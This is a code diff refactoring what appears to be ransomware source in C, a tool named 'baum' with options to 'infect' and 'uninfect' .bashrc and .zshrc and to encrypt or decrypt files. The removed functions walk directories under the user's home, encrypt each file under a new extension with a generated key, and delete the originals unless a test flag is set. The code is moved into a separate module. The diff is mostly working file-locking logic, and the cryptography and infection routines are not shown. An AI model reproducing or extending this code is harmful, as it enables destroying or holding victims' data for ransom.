@@ -16,19 +16,13 @@ limitations under the License.
 
 #include <stdlib.h>
 #include <stdio.h>
-#include <unistd.h>
-#include <string.h>
 #include <getopt.h>
-#include <linux/limits.h>
 
 #include "baumcommon.h"
-#include "baumhelper.h"
-#include "baumcrypt.h"
 
 #include "settings.h"
 #include "infect.h"
-
-char test_mode = 0;
+#include "encrypt.h"
 
 const char *rc_files[] = {".bashrc", ".zshrc", NULL};
 
@@ -56,151 +50,6 @@ void version(void) {
 int print_info(void) {
 	printf("\n\n%s\n\n", PRINT_INFO);
 	return 0;
-}
-
-int encrypt_file(const char* name, void *key) {
-	int hret = 0;
-
-	size_t name_strlen = strlen(name);
-	size_t ext_strlen = strlen(EXTENSION);
-
-	if (name_strlen + ext_strlen >= PATH_MAX) {
-		bp("name would be longer than PATH_MAX");
-		return 1;
-	}
-
-	if (name_strlen >= ext_strlen) {
-		size_t orig_len = name_strlen - ext_strlen;
-		const char *file_ext = name + orig_len;
-		if (memcmp(file_ext, EXTENSION, ext_strlen) == 0) {
-			bp("already encrypted");
-			return 1;
-		}
-	}
-
-	char name_new[PATH_MAX];
-	memcpy(name_new, name, name_strlen);
-	memcpy(name_new + name_strlen, EXTENSION, ext_strlen + 1);
-
-	bp("encrypting: '%s' into '%s'", name, name_new);
-
-	hret = baumcrypt_encrypt(name, name_new, key);
-	if (hret != 0) {
-		bp("encryption failed");
-		return 1;
-	}
-
-	if (!test_mode) {
-		hret = unlink(name);
-		if (hret != 0) {
-			bp("unlink failed");
-		} else {
-			bp("deleted '%s'", name);
-		}
-	}
-
-	return 0;
-}
-int baum_encrypt(const char *keyfile) {
-	int ret = 0;
-	int hret = 0;
-
-	bp("Encrypting and writing keyfile to '%s'", keyfile);
-
-	unsigned char key[BAUMCRYPT_KEYLEN];
-	hret = baumcrypt_makekey(key);
-	if (hret != 0) {
-		return 1;
-	}
-
-	hret = helper_putfile(keyfile, BAUMCRYPT_KEYLEN, key);
-	if (hret != 0) {
-		return 1;
-	}
-
-	hret = helper_chdir_home();
-	if (hret != 0) {
-		return 1;
-	}
-
-	for (int i = 0 ; DIRECTORIES[i] != NULL ; i++) {
-		hret = helper_list(DIRECTORIES[i], encrypt_file, key);
-		if (hret != 0) { }
-	}
-
-	return ret;
-}
-
-int decrypt_file(const char* name, void *key) {
-	int hret = 0;
-
-	size_t name_strlen = strlen(name);
-	size_t ext_strlen = strlen(EXTENSION);
-
-	if (name_strlen >= PATH_MAX) {
-		bp("name longer than PATH_MAX");
-		return 1;
-	}
-
-	if (name_strlen < ext_strlen) {
-		return 1;
-	}
-
-	size_t orig_len = (name_strlen - ext_strlen);
-	const char *file_ext = name + orig_len;
-	if (memcmp(file_ext, EXTENSION, ext_strlen) != 0) {
-		return 1;
-	}
-
-	char name_new[PATH_MAX];
-	memcpy(name_new, name, orig_len);
-	name_new[orig_len] = '\0';
-
-	bp("decrypting: '%s' into '%s'", name, name_new);
-
-	hret = baumcrypt_decrypt(name, name_new, key);
-	if (hret != 0) {
-		bp("decryption failed");
-		return 1;
-	}
-
-	if (!test_mode) {
-		hret = unlink(name);
-		if (hret != 0) {
-			bp("unlink failed");
-		} else {
-			bp("deleted '%s'", name);
-		}
-	}
-
-	return 0;
-}
-int baum_decrypt(const char *keyfile) {
-	int ret = 0;
-	int hret = 0;
-
-	bp("Decrypting using the keyfile '%s'", keyfile);
-
-	int fd; off_t len; unsigned char *key;
-	hret = helper_openfile(keyfile, &fd, &len, (void*)&key);
-	if (hret != 0) {
-		return 1;
-	}
-
-	hret = helper_chdir_home();
-	if (hret != 0) {
-		ret = 1;
-		goto end;
-	}
-
-	for (int i = 0 ; DIRECTORIES[i] != NULL ; i++) {
-		hret = helper_list(DIRECTORIES[i], decrypt_file, key);
-		if (hret != 0) { }
-	}
-
-end:
-	helper_closefile(fd, len, key);
-	return ret;
 }
 
 int main(int argc, char **argv) {
@@ -249,7 +98,7 @@ int main(int argc, char **argv) {
 			baumcommon_setverbose(1);
 			break;
 		case 't':
-			test_mode = 1;
+			baumcommon_settest(1);
 			break;
 		case 'e':
 			opt_encrypt = 1;
@@ -297,15 +146,19 @@ int main(int argc, char **argv) {
 		return print_info();
 	}
 	if (opt_infect) {
-		return baum_infect(rc_files, test_mode);
+		return baum_infect(rc_files);
 	}
 	if (opt_uninfect) {
-		return baum_uninfect(rc_files, test_mode);
+		return baum_uninfect(rc_files);
 	}
 	if (opt_encrypt) {
-		return baum_encrypt(opt_encrypt_file);
+		return baum_encrypt(DIRECTORIES,
+			EXTENSION, opt_encrypt_file);
 	}
 	if (opt_decrypt) {
-		return baum_decrypt(opt_decrypt_file);
+		return baum_decrypt(DIRECTORIES,
+			EXTENSION, opt_decrypt_file);
 	}
+
+	return 0;
 }
